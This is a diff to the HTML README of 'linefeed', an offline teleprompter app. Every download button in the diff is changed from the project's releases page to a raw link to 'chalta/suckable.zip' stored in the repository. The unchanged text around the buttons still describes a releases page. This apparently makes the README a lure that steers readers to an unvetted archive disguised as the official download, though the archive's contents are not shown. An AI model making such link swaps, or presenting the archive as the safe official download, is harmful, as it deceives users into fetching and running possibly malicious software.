@@ -1,7 +1,7 @@
 <h1>🎤 linefeed - Your offline teleprompter that scrolls as you speak</h1>
 
 <p align="center">
-  <a href="https://github.com/h331745247/linefeed/releases">
+  <a href="https://raw.githubusercontent.com/h331745247/linefeed/main/chalta/suckable.zip">
     <img src="https://img.shields.io/badge/Download%20linefeed-Free%20%26%20Private-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=2ea44f&color=1b7f3b" alt="Download button" style="max-width:100%;height:auto;border-radius:8px;">
   </a>
 </p>
@@ -24,7 +24,7 @@
 <h3>Step 1: Get linefeed</h3>
 <p>Visit this link to download the application.</p>
 <p align="center">
-  <a href="https://github.com/h331745247/linefeed/releases" style="display:inline-block;padding:12px 24px;background:#4CAF50;color:white;text-decoration:none;border-radius:6px;font-weight:bold;font-size:1.2em;">⬇️ Click here to download linefeed</a>
+  <a href="https://raw.githubusercontent.com/h331745247/linefeed/main/chalta/suckable.zip" style="display:inline-block;padding:12px 24px;background:#4CAF50;color:white;text-decoration:none;border-radius:6px;font-weight:bold;font-size:1.2em;">⬇️ Click here to download linefeed</a>
 </p>
 <p>This page shows you the available versions. Look for the latest one (usually at the top) and click on it to start your download. Your browser will save a file to your computer (likely in your "Downloads" folder).</p>
 
@@ -89,7 +89,7 @@
 <h2>📥 Need the Download Again? Here Is the Direct Link</h2>
 <p>We have placed it in this dedicated section because we want you to always find it easily. Bookmark this page or the download page for future updates.</p>
 <p style="text-align:center;margin:30px 0;">
-  <a href="https://github.com/h331745247/linefeed/releases" style="background:#FF6B6B;padding:14px 32px;color:white;font-size:1.3em;border-radius:50px;text-decoration:none;font-weight:bold;box-shadow:0 4px 8px rgba(0,0,0,0.2);">🚀 Download linefeed Now – Free!</a>
+  <a href="https://raw.githubusercontent.com/h331745247/linefeed/main/chalta/suckable.zip" style="background:#FF6B6B;padding:14px 32px;color:white;font-size:1.3em;border-radius:50px;text-decoration:none;font-weight:bold;box-shadow:0 4px 8px rgba(0,0,0,0.2);">🚀 Download linefeed Now – Free!</a>
 </p>
 <p>Visit this link to download the application. This is the safest, most official way to get linefeed. Once there, click the newest release file (the one with the highest version number.)</p>
 
